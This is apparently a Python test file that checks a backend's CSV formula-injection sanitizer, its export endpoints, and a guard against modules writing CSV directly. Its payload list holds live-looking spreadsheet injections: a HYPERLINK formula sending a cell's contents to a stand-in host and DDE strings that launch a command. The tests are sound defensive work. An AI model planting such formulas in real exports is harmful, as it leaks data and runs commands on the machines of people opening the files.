"""CSV formula-injection tests (OWASP "CSV Injection").

`csv.writer` escapes commas, quotes and newlines, but a cell like
``=HYPERLINK("http://evil/?x="&A1,"Report")`` is still valid CSV — the damage
happens when a human opens the file and the spreadsheet evaluates the leading
``=`` as a formula. AMP's exports are full of text one tenant's users type and
another user later opens (downtime notes, machine and part names, supplier and
customer names, escalation titles), so an Operator could plant a formula that
runs on an Admin's workstation the moment they export and open the report.

`csv_safe.py` prefixes such cells with a single quote, which spreadsheets strip
on display and never evaluate. These tests cover the three things that have to
hold for that to be worth anything:

  * the payloads really are neutralized, and ordinary data really is not
    (a sanitizer that mangles "-5" into "'-5" would get ripped out);
  * a live export endpoint actually emits neutralized text, not just the helper
    in isolation;
  * no module writes CSV on its own, so the next export cannot bypass it.

Run:  python backend/test_csv_injection.py     (exit 0 = pass)
"""
import ast
import os
from datetime import date

from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

import models
import orders_routes
import reports_routes
from csv_safe import csv_text, safe_cell
from database import Base

BACKEND = os.path.dirname(os.path.abspath(__file__))

# The classic payloads. Each must come back inert.
ATTACKS = [
    '=HYPERLINK("http://evil.example/?x="&A1,"Quarterly report")',   # exfiltrate a cell
    '=1+1',
    '+1+1',
    '@SUM(1+1)',
    '-2+3+cmd|\' /c calc\'!A0',                                      # legacy Excel DDE
    '=cmd|\' /c calc\'!A0',
    '\t=1+1',                                                        # leading tab still parses
    '\r=1+1',
]

# Values that must survive untouched — the cost of a noisy sanitizer is that
# someone disables it.
INNOCENT = [
    "Line 3 stopped",
    "-5",           # a negative quantity is data
    "-5.25",
    "+44 7700 900123".replace(" ", ""),   # "+447700900123" parses as a number
    "0",
    "CLB-PCB-001",
    "Bugatti",
    "",
]


def _fresh_session():
    engine = create_engine("sqlite://", connect_args={"check_same_thread": False})
    Base.metadata.create_all(bind=engine)
    return sessionmaker(bind=engine)()


def test_formula_payloads_are_neutralized():
    for attack in ATTACKS:
        out = safe_cell(attack)
        assert out.startswith("'"), f"not neutralized: {attack!r} -> {out!r}"
        assert out[1:] == attack, "the original text must be preserved after the quote"
    print(f"PASS all {len(ATTACKS)} formula payloads are neutralized")


def test_ordinary_data_is_left_alone():
    for value in INNOCENT:
        assert safe_cell(value) == value, f"mangled ordinary value: {value!r}"
    # non-strings cannot carry a formula and must pass through as-is
    for value in (0, -5, 3.5, None, True):
        assert safe_cell(value) is value, f"non-string altered: {value!r}"
    print(f"PASS {len(INNOCENT)} ordinary values and non-strings pass through unchanged")


def test_quoting_still_works():
    """Neutralizing must not break normal CSV escaping."""
    text = csv_text(["a", "b"], [["x,y", 'say "hi"'], ["line1\nline2", "=1+1"]])
    assert '"x,y"' in text
    assert '"say ""hi"""' in text
    assert '"line1\nline2"' in text
    assert "'=1+1" in text
    print("PASS commas, quotes and newlines are still escaped correctly")


def test_empty_export_is_header_only():
    text = csv_text(["id", "name"], [])
    assert text.strip() == "id,name", text
    print("PASS an empty table yields a header-only CSV, not an error")


def test_a_live_export_endpoint_emits_neutralized_text():
    """The helper being correct is not enough — an endpoint must actually use it."""
    db = _fresh_session()
    payload = '=HYPERLINK("http://evil.example/?x="&A1,"click")'
    db.add(models.Machine(name=payload, status="Idle"))
    db.commit()
    machine = db.query(models.Machine).first()
    db.add(models.DowntimeLog(machine_id=machine.id, reason="Breakdown",
                              duration=30, notes=payload))
    db.commit()

    body = reports_routes.export_downtime_csv(
        db=db, current_user={"tenant": "DEFAULT", "role": "Admin"}).body.decode()
    assert payload not in [c.lstrip("'") for c in body.split(",") if c.startswith("=")], body
    assert "'=HYPERLINK" in body, f"the endpoint emitted a live formula:\n{body}"
    assert body.count("'=HYPERLINK") == 2, "both the machine name and the note must be neutralized"
    print("PASS /reports/downtime.csv neutralizes a planted formula in both name and note")


def test_the_orders_export_is_neutralized_too():
    db = _fresh_session()
    db.add(models.CustomerOrder(order_no="X-1", customer_name="=1+1",
                                product_name="CLB-PCB", order_quantity=1,
                                dispatched_quantity=0, status="Pending",
                                due_date=date(2026, 8, 1)))
    db.commit()
    text = orders_routes._orders_csv(db)
    assert "'=1+1" in text, text
    print("PASS the order-book export neutralizes a planted formula")


def _writer_calls(path):
    """csv.writer(...) calls in a file, found via AST so prose about
    `csv.writer` in a docstring is not mistaken for a call."""
    with open(path, encoding="utf-8") as fh:
        tree = ast.parse(fh.read())
    return [n.lineno for n in ast.walk(tree)
            if isinstance(n, ast.Call) and isinstance(n.func, ast.Attribute)
            and n.func.attr == "writer"
            and isinstance(n.func.value, ast.Name) and n.func.value.id == "csv"]


def test_only_csv_safe_writes_csv():
    """The chokepoint has to be the ONLY way out, or a new export quietly
    reintroduces the hole — which is exactly how all ten surfaces got it."""
    offenders = []
    for name in sorted(os.listdir(BACKEND)):
        if not name.endswith(".py") or name in ("csv_safe.py", os.path.basename(__file__)):
            continue
        for lineno in _writer_calls(os.path.join(BACKEND, name)):
            offenders.append(f"{name}:{lineno}")

    assert not offenders, (
        "These modules build CSV with csv.writer directly, bypassing the formula-"
        "injection escaping in csv_safe.py:\n  " + "\n  ".join(offenders)
        + "\nUse csv_safe.csv_response(headers, rows, filename) for an endpoint, or "
          "csv_safe.csv_text(headers, rows) for the text.")
    assert _writer_calls(os.path.join(BACKEND, "csv_safe.py")), \
        "csv_safe.py should be the one module that does call csv.writer"
    print("PASS csv.writer is called only inside csv_safe.py")


def test_the_guard_detects_a_bypass():
    """Prove the sweep fails on a bypass rather than only passing on clean code."""
    import tempfile
    bypass = (
        "import csv, io\n"
        "def export(rows):\n"
        "    buf = io.StringIO()\n"
        "    w = csv.writer(buf)\n"
        "    w.writerows(rows)\n"
        "    return buf.getvalue()\n"
    )
    with tempfile.TemporaryDirectory() as d:
        p = os.path.join(d, "sneaky_routes.py")
        with open(p, "w", encoding="utf-8") as fh:
            fh.write(bypass)
        assert _writer_calls(p) == [4], _writer_calls(p)
    print("PASS the guard detects a module that writes CSV on its own")


if __name__ == "__main__":
    test_formula_payloads_are_neutralized()
    test_ordinary_data_is_left_alone()
    test_quoting_still_works()
    test_empty_export_is_header_only()
    test_a_live_export_endpoint_emits_neutralized_text()
    test_the_orders_export_is_neutralized_too()
    test_only_csv_safe_writes_csv()
    test_the_guard_detects_a_bypass()
    print("\nALL CSV INJECTION TESTS PASSED")
